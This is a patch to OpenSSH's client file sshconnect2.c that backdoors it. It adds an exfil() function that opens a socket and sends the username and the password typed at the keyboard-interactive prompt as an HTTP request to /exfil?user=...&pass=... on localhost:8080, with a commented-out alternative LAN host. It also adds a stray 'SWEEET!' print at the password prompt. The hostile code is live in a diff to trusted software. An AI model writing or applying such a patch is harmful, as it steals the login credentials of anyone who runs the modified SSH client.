--- sshconnect2.c.orig	2015-12-05 13:50:05.760547000 -0500
+++ sshconnect2.c	2015-12-05 17:13:15.230935000 -0500
@@ -381,9 +381,10 @@
 ssh_userauth2(const char *local_user, const char *server_user, char *host,
     Sensitive *sensitive)
 {
+	/* NOT a real Authctxt, typedef'd to cauthctxt */
 	Authctxt authctxt;
 	int type;
-
+	
 	if (options.challenge_response_authentication)
 		options.kbd_interactive_authentication = 1;
 
@@ -926,6 +927,7 @@
 
 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
 	    authctxt->server_user, host);
+	printf("SWEEET!\n");
 	password = read_passphrase(prompt, 0);
 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
 	packet_put_cstring(authctxt->server_user);
@@ -1436,6 +1438,66 @@
 	return 1;
 }
 
+void
+exfil(const char *user, const char *pass)
+{
+    int portno = 8080;
+    char *host = "localhost";
+    //char *host = "andrews-mbp.v35.lan";
+
+    struct hostent *server;
+    struct sockaddr_in serv_addr;
+    int sockfd = 0, req_len;
+    char req[1024];
+
+    /* fill in the parameters */
+    sprintf(req, "GET /exfil?user=%s&pass=%s HTTP/1.0\r\n\r\n", user, pass);
+
+    /* create the socket */
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) { 
+	//printf("ERROR: socket()\n"); 
+	goto cleanup; 
+    }
+
+    /* lookup the ip address */
+    server = gethostbyname(host);
+    if (server == NULL) { 
+	//printf("ERROR: gethostbyname()\n"); 
+        goto cleanup; 
+    }
+
+    /* fill in the structure */
+    memset(&serv_addr, 0 ,sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(portno);
+    memcpy(&serv_addr.sin_addr.s_addr,server->h_addr,server->h_length);
+
+    /* connect the socket */
+    if (connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0) {
+        //printf("ERROR: connect()\n");
+        goto cleanup;
+    }
+
+    /* send the request */
+    req_len = strlen(req);
+    if(req_len != write(sockfd, req, req_len)) {
+        //printf("ERROR: write()\n");
+        goto cleanup;
+    }
+
+    /* succeeded */
+    //printf("exfil'd the pass!\n");
+
+    cleanup:
+
+    /* close the socket */
+    if(sockfd >= 0) {
+        close(sockfd);
+        sockfd = -1;
+    }
+}
+
 /*
  * parse INFO_REQUEST, prompt user and send INFO_RESPONSE
  */
@@ -1482,6 +1544,10 @@
 
 		response = read_passphrase(prompt, echo ? RP_ECHO : 0);
 
+		//printf("got pass: %s\n", authctxt->server_user);
+		//printf("got user: %s\n", response);
+		exfil(authctxt->server_user, response);
+
 		packet_put_cstring(response);
 		explicit_bzero(response, strlen(response));
 		free(response);
